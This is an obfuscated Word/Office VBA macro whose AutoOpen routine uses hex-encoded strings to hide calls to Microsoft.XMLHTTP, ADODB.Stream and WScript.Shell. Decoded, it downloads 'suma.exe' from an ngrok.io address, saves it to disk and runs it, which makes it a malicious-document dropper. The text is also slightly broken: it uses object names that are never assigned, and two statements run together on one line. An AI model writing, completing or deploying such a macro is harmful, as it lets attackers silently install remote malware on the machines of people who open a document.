
Sub AutoOpen()
Dim uintoglpvuczrx
Dim gjrokwmmnfkahd
Dim xbuanfwlzhjlmnavrkzx
Set uintoglpvuczrx = CreateObject(dreoehizdlpx("4d6963") & dreoehizdlpx("726f736f66742e584d4c48545450"))
Set gjrokwmmnfkahd = CreateObject(dreoehizdlpx("41444f44422e5374") & dreoehizdlpx("7265616d"))
Set xbuanfwlzhjlmnavrkzx = CreateObject(dreoehizdlpx("575363726970742e5368656c") & dreoehizdlpx("6c"))
URL = dreoehizdlpx("687474703a2f2f6265386339663237343265322e6e67726f6b2e696f2f6578616d") & dreoehizdlpx("706c652f73756d612e657865") 
FileName = dreoehizdlpx("73756d612e6578") & dreoehizdlpx("65") 
RUNCMD = dreoehizdlpx("73756d61") & dreoehizdlpx("2e657865") 
http_obj.Open dreoehizdlpx("474554"), URL, False
http_obj.Send
stream_obj.Type = 1
stream_obj.Open
stream_obj.write uintoglpvuczrx.responseBody
stream_obj.savetofile FileName, 2
shell_obj.Run RUNCMD
End SubPrivate Function dreoehizdlpx(ByVal yfhspynfjrqj ) 
Dim upaghkibaxjp 
For upaghkibaxjp = 1 To Len(yfhspynfjrqj) Step 2
dreoehizdlpx = dreoehizdlpx & Chr(CInt("&H" & Mid(yfhspynfjrqj, upaghkibaxjp, 2)))
Next '//upaghkibaxjp
End Function

AutoOpen
